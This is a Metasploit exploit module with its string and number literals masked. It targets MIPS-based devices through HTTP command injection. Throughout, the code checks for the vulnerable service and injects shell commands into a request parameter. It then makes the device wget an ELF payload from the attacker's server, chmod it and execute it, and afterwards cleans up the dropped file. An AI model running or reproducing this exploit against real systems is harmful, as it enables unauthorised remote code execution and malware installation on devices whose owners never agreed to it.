require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Exploit :: EXE include Msf :: Exploit :: FileDropper def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > [ [ <str> , { <str> = > ARCH_MIPSLE , <str> = > <str> } ] , [ <str> , { <str> = > ARCH_MIPSBE , <str> = > <str> } ] , ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def check begin res = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( target_uri . path ) } ) if res && [ <int> ] . include? ( res . code ) && res . headers [ <str> ] && res . headers [ <str> ] =~ <str> return Exploit :: CheckCode :: Detected end rescue :: Rex :: ConnectionError return Exploit :: CheckCode :: Unknown end Exploit :: CheckCode :: Unknown end def exec_command ( cmd , timeout = <int> ) begin res = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( target_uri . path ) , <str> = > false , <str> = > { <str> = > <str> , <str> = > <str> + cmd + <str> } } , timeout ) return res rescue :: Rex :: ConnectionError fail_with ( Failure :: Unreachable , <str> peer <str> ) end end def primer @payload_url = get_uri wget_payload end def exploit print_status ( <str> ) unless check == Exploit :: CheckCode :: Detected fail_with ( Failure :: NoTarget , <str> peer <str> ) end print_status ( <str> ) @pl = generate_payload_exe @payload_url = <str> @dropped_elf = rand_text_alpha ( rand ( <int> ) + <int> ) if datastore [ <str> ] . blank? begin Timeout . timeout ( datastore [ <str> ] ) { super } rescue Timeout :: Error end chmod_payload exec_payload else @payload_url = datastore [ <str> ] wget_payload chmod_payload exec_payload end end def wget_payload upload_path = File . join ( datastore [ <str> ] , @dropped_elf ) cmd = <str> @payload_url <str> upload_path <str> print_status ( <str> ) res = exec_command ( cmd ) if res && [ <int> ] . include? ( res . code ) && res . headers [ <str> ] && res . headers [ <str> ] =~ <str> register_files_for_cleanup ( upload_path ) else fail_with ( Failure :: Unknown , <str> peer <str> ) end end def chmod_payload cmd = <str> File . join ( datastore [ <str> ] , @dropped_elf ) <str> print_status ( <str> ) res = exec_command ( cmd , <int> ) unless res fail_with ( Failure :: Unknown , <str> peer <str> ) end Rex . sleep ( <int> ) end def exec_payload cmd = File . join ( datastore [ <str> ] , @dropped_elf ) print_status ( <str> ) res = exec_command ( cmd , <int> ) unless res fail_with ( Failure :: Unknown , <str> peer <str> ) end Rex . sleep ( <int> ) end def on_request_uri ( cli , request ) print_status ( <str> request . uri <str> ) if request . uri =~ <str> Regexp . escape ( get_resource ) <str> print_status ( <str> ) send_response ( cli , @pl ) end end end 
